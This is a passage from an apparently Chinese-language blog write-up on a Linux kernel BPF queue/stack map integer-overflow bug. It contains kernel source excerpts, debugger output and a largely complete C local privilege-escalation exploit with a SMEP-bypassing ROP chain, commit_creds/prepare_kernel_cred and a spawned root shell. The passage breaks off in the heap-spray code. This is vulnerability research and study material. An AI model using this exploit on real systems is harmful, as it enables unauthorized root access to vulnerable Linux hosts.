class="comment"></span></span><br><span class="line"><span class="comment">static const struct bpf_map_ops * const bpf_map_types[] = &#123;</span></span><br><span class="line"><span class="comment">#define BPF_PROG_TYPE(_id, _ops)</span></span><br><span class="line"><span class="comment">#define BPF_MAP_TYPE(_id, _ops) \</span></span><br><span class="line"><span class="comment">[_id] = &amp;_ops,</span></span><br><span class="line"><span class="comment">#include &lt;linux/bpf_types.h&gt;</span></span><br><span class="line"><span class="comment">#undef BPF_PROG_TYPE</span></span><br><span class="line"><span class="comment">#undef BPF_MAP_TYPE</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br></pre></td></tr></table></figure><p>然后就去分析了下这个结构体，如果想要执行 queue_stack_map_alloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SOCKET_FILTER, sk_filter)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SCHED_CLS, tc_cls_act)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SCHED_ACT, tc_cls_act)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_XDP, xdp)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_BPF</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_SKB, cg_skb)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_SOCK, cg_sock)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_SOCK_ADDR, cg_sock_addr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LWT_IN, lwt_in)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LWT_OUT, lwt_out)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LWT_XMIT, lwt_xmit)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LWT_SEG6LOCAL, lwt_seg6local)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SOCK_OPS, sock_ops)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SK_SKB, sk_skb)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SK_MSG, sk_msg)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_FLOW_DISSECTOR, flow_dissector)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BPF_EVENTS</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_KPROBE, kprobe)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_TRACEPOINT, tracepoint)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_PERF_EVENT, perf_event)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_RAW_TRACEPOINT, raw_tracepoint)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE, raw_tracepoint_writable)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_BPF</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_DEVICE, cg_dev)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_SYSCTL, cg_sysctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BPF_LIRC_MODE2</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LIRC_MODE2, lirc_mode2)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_INET</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SK_REUSEPORT, sk_reuseport)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_ARRAY, array_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PERCPU_ARRAY, percpu_array_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PROG_ARRAY, prog_array_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PERF_EVENT_ARRAY, perf_event_array_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUPS</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_CGROUP_ARRAY, cgroup_array_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_BPF</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_CGROUP_STORAGE, cgroup_storage_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE, cgroup_storage_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_HASH, htab_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PERCPU_HASH, htab_percpu_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_LRU_HASH, htab_lru_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_LRU_PERCPU_HASH, htab_lru_percpu_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_LPM_TRIE, trie_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PERF_EVENTS</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_STACK_TRACE, stack_trace_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_ARRAY_OF_MAPS, array_of_maps_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_HASH_OF_MAPS, htab_of_maps_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_DEVMAP, dev_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_SK_STORAGE, sk_storage_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_BPF_STREAM_PARSER)</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_SOCKMAP, sock_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_SOCKHASH, sock_hash_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_CPUMAP, cpu_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_XDP_SOCKETS)</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_XSKMAP, xsk_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_INET</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_REUSEPORT_SOCKARRAY, reuseport_array_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_QUEUE, queue_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_STACK, stack_map_ops)  <span class="comment">//**</span></span><br></pre></td></tr></table></figure><p>type的值就应该是 <code>BPF_MAP_TYPE(BPF_MAP_TYPE_STACK, stack_map_ops)</code></p><p>这个值会在 <code>map_update_elem</code>被用到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#125; else if (map-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">   map-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;</span><br><span class="line">err = map-&gt;ops-&gt;map_push_elem(map, value, attr-&gt;flags);</span><br></pre></td></tr></table></figure><p>所以我们要获取type的值，这时候我们可以在 find_and_alloc_map 断下来，然后调试出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffff8119d15d    mov    eax, dword ptr [rbx]</span><br><span class="line">   0xffffffff8119d15f    mov    ebp, 0xffffffea</span><br><span class="line"> ► 0xffffffff8119d164    cmp    eax, 0x17</span><br><span class="line"> static struct bpf_map *find_and_alloc_map(union bpf_attr *attr)</span><br><span class="line">&#123;</span><br><span class="line">const struct bpf_map_ops *ops;</span><br><span class="line">u32 type = attr-&gt;map_type;</span><br><span class="line">struct bpf_map *map;</span><br><span class="line">int err;</span><br><span class="line"></span><br><span class="line">if (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line">return ERR_PTR(-EINVAL);</span><br><span class="line">***************</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出 bpf_map_types 最大的idx是 0x17，而要执行queue_stack_map_alloc 就得type就得是最后一个</p><p><code>BPF_MAP_TYPE(BPF_MAP_TYPE_STACK, stack_map_ops)</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o exp exp.c -static -fno-pie</span></span><br><span class="line"><span class="comment">// This is a SMEP bypass exploit against a integer overflow vulnerability </span></span><br><span class="line"><span class="comment">// in Linux kernel bpf module</span></span><br><span class="line"><span class="comment">// The offset used in this exploit is against a custom compiled kernel.</span></span><br><span class="line"><span class="comment">// exploit author: Wei Wu (ww9210@gmail.com)</span></span><br><span class="line"><span class="comment">// modified by : s0xzordIn</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NUMBER 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> native_write_cr4 0xffffffff810037d5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POPRDX 0xffffffff81002dda</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CRED 0xFFFFFFFF810E3D40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS  0xFFFFFFFF810E3AB0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> poprdiret 0xffffffff810013b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> popraxret 0xffffffff81029c71</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs 0xffffffff81c00d5a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> iretq 0xffffffff8106d8f4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stack_pivot_gadget 0xffffffff81954dc8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stack_top_offset 0x674</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> krop_base_to_map 0x81954000</span></span><br><span class="line"><span class="keyword">int</span> rop_start=<span class="number">0x1444</span><span class="number">-8</span>;</span><br><span class="line"><span class="keyword">void</span>* krop_base_mapped;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">        <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">        <span class="string">"pushfq\n"</span></span><br><span class="line">        <span class="string">"popq %2\n"</span></span><br><span class="line">        : <span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_rflags)</span><br><span class="line">        :</span><br><span class="line">        : <span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">    <span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    <span class="keyword">char</span> *args[] = &#123;shell, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(shell, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line">_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[] = &#123;</span><br><span class="line">    popraxret,</span><br><span class="line">    <span class="number">0x6f0</span>,</span><br><span class="line">    <span class="number">0xffffffff81001c51</span>,<span class="comment">//native_write_cr4,</span></span><br><span class="line">    poprdiret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    PREPARE_KERNEL_CRED,</span><br><span class="line">    <span class="number">0xffffffff81001c50</span>, <span class="comment">//: pop rsi ; ret</span></span><br><span class="line">    poprdiret,</span><br><span class="line">    <span class="number">0xffffffff81264e0b</span>,<span class="comment">//: push rax; push rsi; ret; </span></span><br><span class="line">    COMMIT_CREDS,</span><br><span class="line">    swapgs,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    iretq,</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;get_shell,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">//user_cs,</span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//user_rflags,</span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//krop_base_mapped + 0x4000,</span></span><br><span class="line">    <span class="number">0</span><span class="comment">//user_ss</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * fakestack;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_krop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    krop_base_mapped=mmap((<span class="keyword">void</span> *)krop_base_to_map,<span class="number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (krop_base_mapped&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">"mmap failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fakestack=mmap((<span class="keyword">void</span> *)<span class="number">0xa000000000</span>,<span class="number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="number">0x0000000081954dc8</span>=popraxret;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)krop_base_to_map = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x1000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x2000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x3000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x4000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x4000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x3000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x2000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x1000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x10</span>) = stack_pivot_gadget;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    rop_chain[<span class="number">12</span>+<span class="number">2</span>]=user_cs;</span><br><span class="line">    rop_chain[<span class="number">13</span>+<span class="number">2</span>]=user_rflags;</span><br><span class="line">    rop_chain[<span class="number">14</span>+<span class="number">2</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(fakestack + <span class="number">0x6000</span>);</span><br><span class="line">    rop_chain[<span class="number">15</span>+<span class="number">2</span>]=user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(krop_base_mapped+rop_start,rop_chain,<span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"rop_payload_initialized"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_bpf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> r[<span class="number">1</span>] = &#123;<span class="number">0xffffffffffffffff</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defragmentation</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">defragment</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)&#123;</span><br><span 